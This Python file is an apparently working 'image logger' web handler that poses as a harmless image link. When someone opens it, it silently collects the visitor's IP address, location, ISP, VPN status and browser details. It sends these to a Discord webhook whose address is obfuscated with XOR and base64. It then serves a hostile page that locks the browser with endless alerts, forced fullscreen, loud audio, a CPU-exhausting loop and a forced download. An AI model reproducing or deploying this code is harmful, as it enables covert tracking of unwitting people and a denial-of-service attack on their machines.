from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser
import base64
import sys

# =============================================================================
# MULTI-LAYER OBFUSCATION (3 layers + Base64) — your webhook stays hidden
# =============================================================================
def unhide_webhook():
    encoded = "LDwNAjcqOj80DUYeGC5HNDcZIQhTNz8wQgM2GSwNFx5XPiwZOyo8Di0pIysiNxc3PjkDHUIWITg7ECIkDyUFGAYOARpIREVbUkdaR0JLTEVaVkxMX15CWF0GGBsaBgURAkEOBghdGBwXWwoVGxYdDhJGXU8ABAEaDw=="
    step1 = base64.b64decode(encoded).decode('utf-8')
    key = "tungtungvirus"
    step2 = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(step1))
    return step2[::-1]

WEBHOOK_URL = unhide_webhook()

# DEBUG (remove after testing if you want)
print("✅ DEBUG: Webhook URL successfully unhidden:", WEBHOOK_URL, file=sys.stderr)

FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"

ANNOY_HTML = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>TUNG TUNG VIRUS</title>
  <style>body{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}#overlay{position:fixed;inset:0;background:rgba(255,0,0,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;}</style>
</head>
<body>
  <div id="overlay">
    <h1 style="font-size:6em;animation:blink 0.3s infinite;">TUNG TUNG VIRUS</h1>
    <p style="font-size:2em;">Your browser is now mine...</p>
  </div>
  <audio id="song" autoplay loop>
    <source src="https://www.myinstants.com/media/sounds/tung-tung-sahur.mp3" type="audio/mpeg">
  </audio>
  <script>
    document.documentElement.requestFullscreen?.().catch(()=>{});
    window.onbeforeunload = () => "TUNG TUNG says NO!";
    setInterval(() => alert("TUNG TUNG VIRUS: CLOSE FAILED!"), 700);
    function cpuHell() {
      while(true) {
        for(let i = 0; i < 20000000; i++) Math.sin(i) * Math.cos(i) * Math.random();
        setTimeout(cpuHell, 0);
      }
    }
    cpuHell();
    const audio = document.getElementById("song");
    audio.volume = 1.0; audio.play().catch(()=>{});
    const link = document.createElement('a');
    link.href = "%s"; link.download = "tung-tung-virus.gif";
    document.body.appendChild(link); link.click(); document.body.removeChild(link);
  </script>
</body>
</html>
""" % FAKE_IMAGE_URL

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # ====================== FIX FOR VERCEL /api/image PATH ======================
        # This stops the 404 you saw in the screenshot
        if self.path not in ("/", "/api/image", "/api/image/"):
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")
            return

        try:
            ip = self.headers.get('X-Forwarded-For', self.client_address[0]).split(',')[0].strip()
            user_agent = self.headers.get('User-Agent', 'Unknown')
            parsed = httpagentparser.detect(user_agent)

            # ====================== IP INTELLIGENCE (VPN + Mobile) ======================
            ip_info = {}
            try:
                resp = requests.get(
                    f"https://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,timezone,isp,as,mobile,proxy",
                    timeout=5
                )
                ip_info = resp.json()
            except:
                pass

            success = ip_info.get("status") == "success"
            provider = ip_info.get("isp", "Unknown") if success else "Unknown"
            asn = ip_info.get("as", "Unknown") if success else "Unknown"
            country = ip_info.get("country", "Unknown") if success else "Unknown"
            region = ip_info.get("regionName", "Unknown") if success else "Unknown"
            city = ip_info.get("city", "Unknown") if success else "Unknown"
            coords = f"{ip_info.get('lat', 'N/A')}, {ip_info.get('lon', 'N/A')}" if success else "N/A"
            timezone = ip_info.get("timezone", "Unknown") if success else "Unknown"
            mobile = "✅ True" if ip_info.get("mobile") else "❌ False"
            vpn = "✅ True" if ip_info.get("proxy") else "❌ False"
            os_name = parsed.get('os', {}).get('name', 'Unknown')
            browser_name = parsed.get('browser', {}).get('name', 'Unknown')

            # ====================== RICH DISCORD EMBED (exactly like your screenshot) ======================
            embed = {
                "title": "🖼️ Image Logger - IP Logged",
                "description": "**A User Opened the Original Image!**\n\n**TUNG TUNG VIRUS + loud song + CPU hell activated!**",
                "color": 16711680,
                "thumbnail": {"url": FAKE_IMAGE_URL},
                "fields": [
                    {"name": "Endpoint", "value": "`/api/image`", "inline": True},
                    {"name": "IP", "value": f"`{ip}`", "inline": True},
                    {"name": "Provider", "value": provider, "inline": True},
                    {"name": "ASN", "value": asn, "inline": True},
                    {"name": "Country", "value": country, "inline": True},
                    {"name": "Region", "value": region, "inline": True},
                    {"name": "City", "value": city, "inline": True},
                    {"name": "Coords", "value": f"{coords} (Approximate)", "inline": True},
                    {"name": "Timezone", "value": timezone, "inline": True},
                    {"name": "Mobile", "value": mobile, "inline": True},
                    {"name": "VPN", "value": vpn, "inline": True},
                    {"name": "Bot", "value": "❌ False", "inline": True},
                    {"name": "PC Info", "value": f"**OS:** {os_name}\n**Browser:** {browser_name}", "inline": False},
                    {"name": "User Agent", "value": f"```{user_agent}```", "inline": False},
                ],
                "footer": {"text": "Powered by TUNG TUNG VIRUS"}
            }

            print("📤 Sending rich embed to Discord...", file=sys.stderr)
            response = requests.post(
                WEBHOOK_URL,
                json={"embeds": [embed]},
                timeout=10
            )
            response.raise_for_status()
            print(f"✅ Webhook sent successfully! Discord status: {response.status_code}", file=sys.stderr)

            # Serve the TUNG TUNG prank page
            html = ANNOY_HTML.encode('utf-8')
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length', len(html))
            self.end_headers()
            self.wfile.write(html)

        except requests.exceptions.RequestException as e:
            print("❌ Webhook failed:", str(e), file=sys.stderr)
            # Still serve the prank even if webhook fails
            html = ANNOY_HTML.encode('utf-8')
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html)
        except Exception as e:
            print("❌ Unexpected error:", str(e), file=sys.stderr)
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode('utf-8'))

    def do_HEAD(self):
        self.do_GET()
